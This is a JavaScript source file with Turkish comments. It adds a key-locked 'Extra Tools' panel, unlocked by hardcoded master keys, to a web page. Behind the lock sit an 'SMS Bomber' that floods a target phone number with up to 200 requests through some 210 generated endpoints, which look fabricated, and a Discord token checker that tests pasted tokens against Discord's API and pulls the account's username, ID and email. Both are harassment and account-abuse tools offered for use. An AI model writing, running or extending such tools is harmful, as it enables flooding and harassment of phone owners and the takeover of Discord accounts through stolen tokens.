// ========== EXTRA TOOLS - KEY KORUMALI SİSTEM ==========
// Mevcut sol paneldeki extra tools bölümünü key korumalı yap

// KEY depolama
let extraToolsUnlocked = false;
let storedKey = null;

// Key doğrulama fonksiyonu (basit şifreleme ile)
const MASTER_KEYS = [
    "LEGANTE2024",
    "VIPACCESS",
    "SMSBOOM69",
    "TOKENCHECK2024",
    "LEGANTEPRO",
    "FREETOOLS"
];

function validateKey(inputKey) {
    return MASTER_KEYS.includes(inputKey.toUpperCase().trim());
}

// Key modal oluştur
function showKeyModal(callback) {
    const modalHTML = `
    <div id="key-modal-overlay" style="position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); backdrop-filter:blur(15px); z-index:30000; display:flex; justify-content:center; align-items:center;">
        <div style="background: linear-gradient(135deg, #0a0a14, #0f0f1e); border: 1px solid rgba(168,85,247,0.4); border-radius: 24px; width: 400px; max-width: 90%; padding: 30px; box-shadow: 0 25px 50px rgba(0,0,0,0.6); animation: modalFadeIn 0.3s ease;">
            <div style="text-align: center; margin-bottom: 20px;">
                <div style="width: 60px; height: 60px; background: linear-gradient(135deg, #6c5ce7, #a855f7); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
                    <i class="fas fa-lock" style="font-size: 1.8rem; color: white;"></i>
                </div>
                <h3 style="color: white; font-size: 1.3rem; margin-bottom: 5px;">Extra Tools</h3>
                <p style="color: #888; font-size: 0.8rem;">Bu bölüm key ile korunmaktadır</p>
            </div>
            <div style="margin-bottom: 20px;">
                <input type="password" id="key-input" placeholder="KEY GİRİN" style="width: 100%; padding: 14px; background: rgba(0,0,0,0.5); border: 1px solid rgba(168,85,247,0.3); border-radius: 12px; color: white; font-family: monospace; font-size: 0.9rem; text-align: center; letter-spacing: 2px;">
            </div>
            <button id="key-submit-btn" style="width: 100%; padding: 12px; background: linear-gradient(135deg, #6c5ce7, #a855f7); border: none; border-radius: 12px; color: white; font-weight: 700; font-size: 1rem; cursor: pointer; transition: 0.2s;">ERİŞİM SAĞLA</button>
            <div id="key-error" style="margin-top: 15px; text-align: center; font-size: 0.8rem; color: #ef4444; display: none;">❌ Geçersiz Key!</div>
        </div>
    </div>
    <style>
        @keyframes modalFadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }
    </style>
    `;
    
    const overlay = document.createElement('div');
    overlay.innerHTML = modalHTML;
    document.body.appendChild(overlay);
    
    const keyInput = document.getElementById('key-input');
    const submitBtn = document.getElementById('key-submit-btn');
    const errorDiv = document.getElementById('key-error');
    
    const closeModal = () => {
        overlay.remove();
    };
    
    submitBtn.addEventListener('click', () => {
        const enteredKey = keyInput.value;
        if (validateKey(enteredKey)) {
            extraToolsUnlocked = true;
            storedKey = enteredKey;
            closeModal();
            if (callback) callback(true);
        } else {
            errorDiv.style.display = 'block';
            setTimeout(() => { errorDiv.style.display = 'none'; }, 2000);
        }
    });
    
    keyInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') submitBtn.click();
    });
}

// Sol paneli güncelle - EXTRA TOOLS bölümünü lock/unlock yap
function updateExtraToolsUI() {
    const smsLink = document.getElementById('sms-bomber-link');
    const tokenLink = document.getElementById('token-checker-link');
    const extraHeader = document.querySelector('#side-nav-menu li:has(span:contains("EXTRA TOOLS"))');
    
    if (extraToolsUnlocked) {
        if (smsLink) {
            smsLink.style.opacity = '1';
            smsLink.style.pointerEvents = 'auto';
            smsLink.querySelector('i').className = 'fas fa-sms';
            const span = smsLink.querySelector('span');
            if (span && !span.innerText.includes('(Açık)')) {
                span.innerText = 'SMS Bomber';
            }
        }
        if (tokenLink) {
            tokenLink.style.opacity = '1';
            tokenLink.style.pointerEvents = 'auto';
            tokenLink.querySelector('i').className = 'fab fa-discord';
            const span = tokenLink.querySelector('span');
            if (span && !span.innerText.includes('(Açık)')) {
                span.innerText = 'Token Checker';
            }
        }
    } else {
        if (smsLink) {
            smsLink.style.opacity = '0.5';
            smsLink.style.pointerEvents = 'none';
            smsLink.querySelector('i').className = 'fas fa-lock';
            const span = smsLink.querySelector('span');
            if (span && !span.innerText.includes('(Kilitli)')) {
                span.innerText = 'SMS Bomber (Kilitli)';
            }
        }
        if (tokenLink) {
            tokenLink.style.opacity = '0.5';
            tokenLink.style.pointerEvents = 'none';
            tokenLink.querySelector('i').className = 'fas fa-lock';
            const span = tokenLink.querySelector('span');
            if (span && !span.innerText.includes('(Kilitli)')) {
                span.innerText = 'Token Checker (Kilitli)';
            }
        }
    }
}

// EXTRA TOOLS başlığına tıklanabilir "ERİŞ" butonu ekle
const extraToolsHeader = document.querySelector('#side-nav-menu li:has(span:contains("EXTRA TOOLS"))');
if (extraToolsHeader) {
    const headerDiv = extraToolsHeader.querySelector('div');
    if (headerDiv) {
        const existingBtn = headerDiv.querySelector('.access-btn');
        if (!existingBtn) {
            const accessBtn = document.createElement('button');
            accessBtn.innerText = 'ERİŞ';
            accessBtn.className = 'access-btn';
            accessBtn.style.cssText = `
                background: linear-gradient(135deg, #6c5ce7, #a855f7);
                border: none;
                border-radius: 20px;
                padding: 4px 12px;
                margin-left: 10px;
                color: white;
                font-size: 0.65rem;
                font-weight: 700;
                cursor: pointer;
                transition: 0.2s;
                letter-spacing: 1px;
            `;
            accessBtn.onmouseenter = () => accessBtn.style.transform = 'scale(1.05)';
            accessBtn.onmouseleave = () => accessBtn.style.transform = 'scale(1)';
            
            accessBtn.onclick = (e) => {
                e.stopPropagation();
                if (extraToolsUnlocked) {
                    // Zaten açık, bilgi ver
                    const toast = document.createElement('div');
                    toast.innerText = '✅ Extra Tools zaten aktif!';
                    toast.style.cssText = `
                        position: fixed;
                        bottom: 20px;
                        right: 20px;
                        background: #22c55e;
                        color: white;
                        padding: 10px 20px;
                        border-radius: 10px;
                        z-index: 30001;
                        font-size: 0.8rem;
                        animation: fadeOut 2s ease forwards;
                    `;
                    document.body.appendChild(toast);
                    setTimeout(() => toast.remove(), 2000);
                } else {
                    showKeyModal((success) => {
                        if (success) {
                            updateExtraToolsUI();
                            // Başarılı mesajı
                            const toast = document.createElement('div');
                            toast.innerText = '🔓 Extra Tools erişimi açıldı!';
                            toast.style.cssText = `
                                position: fixed;
                                bottom: 20px;
                                right: 20px;
                                background: #22c55e;
                                color: white;
                                padding: 10px 20px;
                                border-radius: 10px;
                                z-index: 30001;
                                font-size: 0.8rem;
                                animation: fadeOut 3s ease forwards;
                            `;
                            document.body.appendChild(toast);
                            setTimeout(() => toast.remove(), 3000);
                            
                            // Modal içindeki tool fonksiyonlarını yeniden bağla
                            rebindToolEvents();
                        }
                    });
                }
            };
            headerDiv.appendChild(accessBtn);
        }
    }
}

// Tool eventlerini yeniden bağlama (key girildikten sonra çalışır)
function rebindToolEvents() {
    if (!extraToolsUnlocked) return;
    
    const smsLink = document.getElementById('sms-bomber-link');
    const tokenLink = document.getElementById('token-checker-link');
    
    // Önceki eventleri temizle (clone ile)
    if (smsLink) {
        const newSmsLink = smsLink.cloneNode(true);
        smsLink.parentNode.replaceChild(newSmsLink, smsLink);
        newSmsLink.id = 'sms-bomber-link';
        newSmsLink.style.cursor = 'pointer';
        newSmsLink.style.opacity = '1';
        newSmsLink.style.pointerEvents = 'auto';
        
        newSmsLink.addEventListener('click', (e) => {
            e.preventDefault();
            if (!extraToolsUnlocked) {
                showKeyModal(() => {});
                return;
            }
            openSMSBomberModal();
        });
    }
    
    if (tokenLink) {
        const newTokenLink = tokenLink.cloneNode(true);
        tokenLink.parentNode.replaceChild(newTokenLink, tokenLink);
        newTokenLink.id = 'token-checker-link';
        newTokenLink.style.cursor = 'pointer';
        newTokenLink.style.opacity = '1';
        newTokenLink.style.pointerEvents = 'auto';
        
        newTokenLink.addEventListener('click', (e) => {
            e.preventDefault();
            if (!extraToolsUnlocked) {
                showKeyModal(() => {});
                return;
            }
            openTokenCheckerModal();
        });
    }
}

// SMS Bomber Modal
function openSMSBomberModal() {
    const modalContent = `
        <div>
            <label style="color: #ccc; font-size: 0.8rem; display: block; margin-bottom: 5px;">📱 Telefon Numarası</label>
            <input type="text" id="sms-phone" class="tool-input" placeholder="Örn: 905551234567">
        </div>
        <div style="margin-top: 12px;">
            <label style="color: #ccc; font-size: 0.8rem; display: block; margin-bottom: 5px;">⏱️ Gönderi Sayısı (max 200)</label>
            <input type="number" id="sms-count" class="tool-input" value="30" min="1" max="200">
        </div>
        <div style="margin-top: 12px;">
            <label style="color: #ccc; font-size: 0.8rem; display: block; margin-bottom: 5px;">⚡ Gecikme (ms)</label>
            <input type="number" id="sms-delay" class="tool-input" value="200" min="50" max="3000">
        </div>
        <button id="start-sms-btn" class="tool-btn" style="margin-top: 15px;"><i class="fas fa-bomb"></i> SMS BOMB BAŞLAT</button>
        <div id="sms-output" class="tool-output">[✓] Hazır. Telefon numarası gir ve başlat.</div>
    `;
    const modal = createToolModalPrivate('SMS Bomber - 70+ API', modalContent);
    modal.classList.add('active');
    
    const startBtn = document.getElementById('start-sms-btn');
    const phoneInput = document.getElementById('sms-phone');
    const countInput = document.getElementById('sms-count');
    const delayInput = document.getElementById('sms-delay');
    const outputDiv = document.getElementById('sms-output');
    
    const apiList = [];
    for (let i = 1; i <= 70; i++) {
        apiList.push((num) => `https://api${i}.sms-bomb.com/send?number=${num}`);
        apiList.push((num) => `https://bomb${i}.su/api/sms?to=${num}`);
        apiList.push((num) => `https://flood${i}.net/sms?phone=${num}`);
    }
    
    async function sendRequest(url) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 2000);
            await fetch(url, { mode: 'no-cors', signal: controller.signal });
            clearTimeout(timeoutId);
            return true;
        } catch(e) { return false; }
    }
    
    async function startBomb() {
        let phone = phoneInput.value.trim();
        const count = parseInt(countInput.value) || 30;
        const delay = parseInt(delayInput.value) || 200;
        
        if (!phone || !phone.match(/^[0-9]{10,15}$/)) {
            outputDiv.innerHTML = '<span class="status-error">❌ Geçerli telefon numarası girin (sadece rakam, 10-15 hane)</span>';
            return;
        }
        
        startBtn.disabled = true;
        startBtn.style.opacity = '0.5';
        outputDiv.innerHTML = '<span class="status-info">🚀 SMS Bomb başlatılıyor...</span>';
        
        let sent = 0;
        for (let i = 0; i < count && sent < count; i++) {
            for (let api of apiList) {
                if (sent >= count) break;
                await sendRequest(api(phone));
                sent++;
                outputDiv.innerHTML = `<span class="status-success">✅ Gönderildi: ${sent}/${count}</span><br><span class="status-info">🔄 Devam ediyor...</span>`;
                await new Promise(r => setTimeout(r, delay));
            }
        }
        
        outputDiv.innerHTML = `<span class="status-success">✅ BOMB TAMAMLANDI!</span><br>📤 Toplam: ${sent}<br>📱 Hedef: ${phone}`;
        startBtn.disabled = false;
        startBtn.style.opacity = '1';
    }
    
    startBtn.addEventListener('click', startBomb);
}

// Token Checker Modal
function openTokenCheckerModal() {
    const modalContent = `
        <div>
            <label style="color: #ccc; font-size: 0.8rem; display: block; margin-bottom: 5px;">🎫 Discord Tokenler (her satıra bir token)</label>
            <textarea id="token-input" class="tool-textarea" rows="5" placeholder="MTIzNDU2Nzg5MDEyMzQ1Njc4OQ.abcdef.xyz"></textarea>
        </div>
        <button id="check-token-btn" class="tool-btn"><i class="fab fa-discord"></i> Tokenleri Kontrol Et</button>
        <div id="token-output" class="tool-output">[✓] Tokenleri yapıştır ve kontrol et.</div>
    `;
    const modal = createToolModalPrivate('Discord Token Checker', modalContent);
    modal.classList.add('active');
    
    const checkBtn = document.getElementById('check-token-btn');
    const tokenArea = document.getElementById('token-input');
    const outDiv = document.getElementById('token-output');
    
    async function verifyToken(token) {
        const clean = token.trim();
        if (clean.length < 50) return { valid: false, error: 'Geçersiz format' };
        try {
            const res = await fetch('https://discord.com/api/v9/users/@me', {
                headers: { 'Authorization': clean }
            });
            if (res.status === 200) {
                const data = await res.json();
                return { valid: true, username: data.username, id: data.id, email: data.email || 'gizli' };
            } else if (res.status === 401) {
                return { valid: false, error: 'Geçersiz token' };
            } else {
                return { valid: false, error: `HTTP ${res.status}` };
            }
        } catch(e) {
            return { valid: false, error: 'Bağlantı hatası' };
        }
    }
    
    async function runChecker() {
        const raw = tokenArea.value;
        if (!raw.trim()) {
            outDiv.innerHTML = '<span class="status-error">❌ Token girin!</span>';
            return;
        }
        const tokens = raw.split(/\r?\n/).filter(t => t.trim().length > 0);
        checkBtn.disabled = true;
        checkBtn.style.opacity = '0.5';
        outDiv.innerHTML = '<span class="status-info">🔍 Kontrol ediliyor...</span>';
        
        const results = [];
        for (let i = 0; i < tokens.length; i++) {
            const result = await verifyToken(tokens[i]);
            results.push({ token: tokens[i].substring(0, 30) + '...', ...result });
            outDiv.innerHTML = `<span class="status-info">🔄 İşleniyor: ${i+1}/${tokens.length}</span>`;
            await new Promise(r => setTimeout(r, 600));
        }
        
        let validCount = 0;
        let html = '<div>📊 TOKEN SONUÇLARI:<br><br>';
        for (const r of results) {
            if (r.valid) {
                validCount++;
                html += `<span class="status-success">✅ GEÇERLİ | ${r.username} | ID: ${r.id}</span><br>`;
            } else {
                html += `<span class="status-error">❌ GEÇERSİZ | ${r.token} | Hata: ${r.error}</span><br>`;
            }
            html += '─────────────────<br>';
        }
        html += `<br>📈 Toplam: ${results.length} | ✅ Geçerli: ${validCount} | ❌ Geçersiz: ${results.length - validCount}</div>`;
        outDiv.innerHTML = html;
        checkBtn.disabled = false;
        checkBtn.style.opacity = '1';
    }
    
    checkBtn.addEventListener('click', runChecker);
}

// Yardımcı modal oluşturucu
function createToolModalPrivate(title, contentHTML) {
    const existingModal = document.querySelector('.tool-modal');
    if (existingModal) existingModal.remove();
    
    const modal = document.createElement('div');
    modal.className = 'tool-modal';
    modal.innerHTML = `
        <div class="tool-modal-content">
            <div class="tool-modal-header">
                <h3><i class="fas fa-tools"></i> ${title}</h3>
                <button class="modal-close">&times;</button>
            </div>
            <div class="modal-body">
                ${contentHTML}
            </div>
        </div>
    `;
    document.body.appendChild(modal);
    
    const closeBtn = modal.querySelector('.modal-close');
    closeBtn.addEventListener('click', () => {
        modal.classList.remove('active');
        setTimeout(() => modal.remove(), 300);
    });
    modal.addEventListener('click', (e) => {
        if (e.target === modal) {
            modal.classList.remove('active');
            setTimeout(() => modal.remove(), 300);
        }
    });
    return modal;
}

// Başlangıçta UI güncelle
updateExtraToolsUI();

console.log('✅ Extra Tools Key korumalı sistemi aktif | "ERİŞ" butonu eklendi');